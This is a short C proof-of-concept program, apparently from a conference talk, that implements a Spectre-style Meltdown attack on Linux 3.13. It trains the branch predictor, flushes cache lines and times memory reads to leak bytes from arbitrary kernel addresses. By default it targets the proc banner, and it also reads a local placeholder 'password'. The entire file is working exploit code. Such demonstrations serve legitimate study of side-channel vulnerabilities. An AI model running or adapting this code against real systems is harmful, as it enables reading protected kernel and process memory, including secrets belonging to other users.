/*
 * Spectre-Based Meltdown Attack for Linux 3.13 (99 Lines)
 * by Andriy Berestovskyy <berestovskyy@gmail.com>
 * See: https://www.slideshare.net/AndriyBerestovskyy/the-spectre-of-meltdowns
 * Based on "Spectre Attack" by Paul Kocher et al
 */
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <unistd.h>
#include <x86intrin.h>

#define ENABLE_MELTDOWN       /* comment this out to disable Meltdown */
#define MIN_READS       100   /* minimum reads before analyse the results */
#define MAX_READ_CYCLES 1000  /* drop too long reads */
#define BRANCH_TRAINS   6     /* train branch predictor 6 times */
#define BYTE_VALUES     256   /* number of values in byte */
#define PAGE_SIZE       4096  /* for x86 the default is 4K */

size_t array_size = BRANCH_TRAINS; /* cache miss is needed accessing this */
uint8_t side_effects[BYTE_VALUES * PAGE_SIZE] = {1}; /* to avoid zero page */
uint8_t base_array[BRANCH_TRAINS]; /* array to train branch predictor */
uint8_t tmp;                       /* to avoid compiler optimizations */
char secret[] = "My password";     /* some secret data (for Spectre) */
#ifdef ENABLE_MELTDOWN
int fd;
#endif

__attribute__((noinline)) uint8_t bounds_check(uint64_t idx)
{
	if (idx < array_size) /* no reading outside the array, or is it? */
		return side_effects[base_array[idx] * PAGE_SIZE];
	return 0; /* just return 0 if index is out of range */
}

uint8_t read_any_byte(uint64_t addr)
{
	size_t tries, i, sum = 0, cnt = 0, mins[BYTE_VALUES];

	addr -= (uint64_t)&base_array; /* adjust address to the base_array */
	for (i = 0; i < BYTE_VALUES; i++)
		mins[i] = SIZE_MAX;

	for (tries = 0; tries < MIN_READS * 5; tries++) {
#ifdef ENABLE_MELTDOWN
		char buf[PAGE_SIZE]; /* valid syscall to cache proc_banner */
		if (fd > 0 && pread(fd, &buf, sizeof(buf), 0) < 0)
			perror("Error reading /proc/version");
#endif
		for (i = 1; i <= BRANCH_TRAINS * 4; i++) {
			_mm_clflush(&array_size); /* flush array size */
			sched_yield(); /* tiny pause */
			tmp = bounds_check(addr & (i % BRANCH_TRAINS - 1));
		}

		for (i = 1; i < BYTE_VALUES; i++) { /* 0 is cache (training) */
			__sync_synchronize();
			register uint64_t start_tsc = __rdtsc();
			tmp = side_effects[i * PAGE_SIZE]; /* touch the array */
			__sync_synchronize();
			register uint64_t cycles = __rdtsc() - start_tsc;
			_mm_clflush(&side_effects[i * PAGE_SIZE]);

			if (cycles > MAX_READ_CYCLES)
				break; /* i.e. read was interrupted etc */
			else if (cycles < mins[i])
				mins[i] = cycles;

			if (cnt > MIN_READS && mins[i] < sum / cnt * 2 / 3)
				return i; /* below average, i.e. cache hit */

			sum += cycles;
			cnt++;
		}
	}

	return 0; /* no cache hits, so it is 0 indeed */
}

int main(int argc, char **argv)
{
	uint8_t byte;
	uint64_t addr = (uint64_t)&secret;
#ifdef ENABLE_MELTDOWN
	addr = argc < 2 ? 0xffffffff81800040ULL /* 3.13 linux_proc_banner */
	 		: strtoull(argv[1], NULL, 16); /* or any other addres */
	addr = addr != 0 ? addr : (uint64_t)&secret; /* or 0 for Spectre */
	if ((fd = open("/proc/version", O_RDONLY)) < 0)
		perror("Error opening /proc/version");
#endif
	do {
		byte = read_any_byte(addr);
		printf("0x%" PRIx64 " = 0x%x ('%c')\n", addr++, byte, byte);
	} while (byte != 0);

	return 0;
}
